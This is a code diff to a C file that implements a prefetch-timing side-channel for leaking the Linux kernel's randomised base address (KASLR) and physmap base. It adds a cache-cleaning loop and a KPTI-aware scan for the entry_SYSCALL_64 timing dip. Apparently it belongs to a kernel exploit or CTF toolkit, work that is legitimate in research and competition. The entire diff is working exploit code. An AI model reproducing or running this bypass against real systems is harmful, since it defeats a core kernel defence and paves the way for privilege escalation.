@@ -1,4 +1,5 @@
 #include "kaslr.h"
+
 uint64_t sidechannel(uint64_t addr) {
   uint64_t a, b, c, d;
   asm volatile (".intel_syntax noprefix;"
@@ -7,16 +8,16 @@ uint64_t sidechannel(uint64_t addr) {
     "mov %0, rax;"
     "mov %1, rdx;"
     "xor rax, rax;"
-    "mfence;"
-    "prefetcht2 qword ptr [%4];"
-    "prefetcht2 qword ptr [%4];"
-    "prefetcht2 qword ptr [%4];"
+    "lfence;"
+    "prefetcht0 qword ptr [%4];"
+    "prefetcht0 qword ptr [%4];"
     "xor rax, rax;"
-    "mfence;"
+    "lfence;"
     "rdtscp;"
     "mov %2, rax;"
     "mov %3, rdx;"
     "mfence;"
+    
     ".att_syntax;"
     : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
     : "r" (addr)
@@ -26,8 +27,90 @@ uint64_t sidechannel(uint64_t addr) {
   return c - a;
 }
 
+void clean_cache(size_t base){
+    for(int i=0;i<0x100;i++){
+        // Access Order
+        // int mess = (i*167+13)%0x200; // Makes no diff
+        int mess = i;
+        char *probe = mess*0x1000+base;
+        // prefecth access
+        sidechannel(probe);
+        // If we don't do clean_cache, we lose some suceess rate
+        // Just about 0.8 sec
+        // probe = 1;
+    }
+}
 
-uint64_t leak_phy(void) 
+
+uint64_t leak_syscall_entry(int pti,int boost) 
+{
+    char *trash = malloc(0x100000);
+    uint64_t data[ARR_SIZE] = {0};
+    uint64_t min = ~0, addr = ~0;
+
+    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
+    {
+        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) 
+        {
+            
+            // syscall(0x68);
+            // Arbitrary SYSCALL is fine, I use this to avoid accessing other code
+            // It should go into syscall and return quickly
+            syscall(0x144,0x132,0x132); // Makes no diff but a little faster
+            uint64_t time = sidechannel(SCAN_START + idx * STEP);
+            if(!boost)
+                clean_cache(trash);
+            if (i >= DUMMY_ITERATIONS)
+                data[idx] += time;
+        }
+    }
+
+    for (int i = 0; i < ARR_SIZE; i++)
+    {
+        data[i] /= ITERATIONS;
+        if (data[i] < min)
+        {
+            min = data[i];
+            addr = SCAN_START + i * STEP;
+        }
+        // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
+    }
+    int previous_data = data[1];
+
+    if(pti){
+        // More analysis for pti
+        for(int i = 2; i< ARR_SIZE; i++)
+        {
+            if(data[i]>previous_data*1.1)
+            {
+                //outliner
+                continue;
+            }
+            // Find the `dent`
+            if( data[i]< previous_data && previous_data-data[i] > 0.15*previous_data && (data[i]-min)<min*1.05 )
+            {
+                addr = SCAN_START + i * STEP;
+                break;
+            }
+            previous_data = data[i];
+        }
+    }
+    return addr;
+}
+
+size_t leakKASLR(int pti, size_t offset, int boost){
+    size_t val = leak_syscall_entry(pti,boost) + offset;
+    // No pti so we leaked the address of Kernel Starts instead of entry_SYSCALL_64
+    if(!pti) 
+        val = val - entry_SYSCALL_64_offset;
+    printf ("KASLR  base %llx\n", val);
+    return val;
+}
+
+
+
+
+uint64_t leak_phys(void) 
 {
     uint64_t data[ARR_SIZE_PHYS] = {0};
     uint64_t min = ~0, addr = ~0;
@@ -53,48 +136,8 @@ uint64_t leak_phy(void)
     }
     return addr;
 }
-uint64_t leak_syscall_entry(void) 
-{
-    uint64_t data[ARR_SIZE] = {0};
-    uint64_t min = ~0, addr = ~0;
-
-    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
-    {
-        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) 
-        {
-            uint64_t test = SCAN_START + idx * STEP;
-            syscall(104);
-            uint64_t time = sidechannel(test);
-            if (i >= DUMMY_ITERATIONS)
-                data[idx] += time;
-            
-        }
-    }
-    // 1. Is my cache too huge so it keeps pages in the last round in the cache? [TODO]
-    // 2. Find the dental
-    // 3. The first 0x10 
-    for (int i = 0; i < ARR_SIZE; i++)
-    {
-        data[i] /= ITERATIONS;
-        if (data[i] < min)
-        {
-            min = data[i];
-            addr = SCAN_START + i * STEP;
-        }
-        printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
-    }
-
-    return addr;
-}
-
-size_t leakKASLR(size_t offset){
-    size_t val = leak_syscall_entry() - entry_SYSCALL_64_offset+offset;
-    printf ("KASLR  base %llx\n", val);
-    return val;
-}
-
-size_t leakPHY(size_t offset){
-    size_t val =  leak_phy() - 0x100000000+offset;
+size_t leakPHYS(size_t offset){
+    size_t val =  leak_phys() - 0x100000000+offset;
     printf ("PHAMAP base %llx\n",val);
     return val;
 }
